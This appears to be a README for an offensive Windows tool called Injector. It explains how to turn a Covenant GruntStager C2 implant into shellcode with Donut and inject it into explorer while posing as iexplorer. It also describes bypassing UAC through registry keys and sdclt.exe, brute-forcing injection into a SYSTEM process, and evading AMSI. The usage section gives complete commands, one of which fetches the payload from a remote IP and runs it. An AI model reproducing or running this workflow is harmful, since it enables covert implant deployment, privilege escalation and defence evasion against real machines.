# Injector

Injects shellcode into memory, tries to bypass UAC, and automatically tries to escalate to system

## Credits
This project is built upon the shoulders of giants:

@_RastaMouse -> Their work on TikiTorch and shell injection formed the groundwork for how the injector operates

@Cobbr_IO -> For the SharpSploit and Covenant projects

@TheRealWover -> For the Donut library and project


## PayLoad Creation (ShellcodeCreate.py)
Installation:
``` pip3 install donut-shellcode ```

Flags:
```
python3 ShellcodeCreate.py -h                           
usage: ShellcodeCreate.py [-h] [-f FILENAME] [-o OUTPUT]

arguments:
  -h, --help            show this help message and exit
  -f FILENAME, --filename FILENAME
                        input file
  -o OUTPUT, --output OUTPUT
                        output file
```
Step1: Download the relevant GruntStager binary from covenant
Step2: Generate Payload
```
python3 ShellcodeCreate.py -f GruntStager.exe -o payload.txt
```

Current donut implementation results in shellcode also bypassing AMSI

## Injector.exe

```
Flags:
-w  <IP Address to Payload.txt>

-f <full path to payload.txt>

Injector.exe -f /path/to/payload.txt

Injector.exe -w http://10.10.10.123:8080/payload.txt
```

### Workflow
1. Identifies current user and injects payload under applicable explorer process (pretending to be iexplorer)
2. If user is local admin performs UAC bypass using Reg Keys and sdclt.exe
3. Attempts to bruteforce injection under System process (resulting in system level payload being exectued) (pretending to be iexplorer)


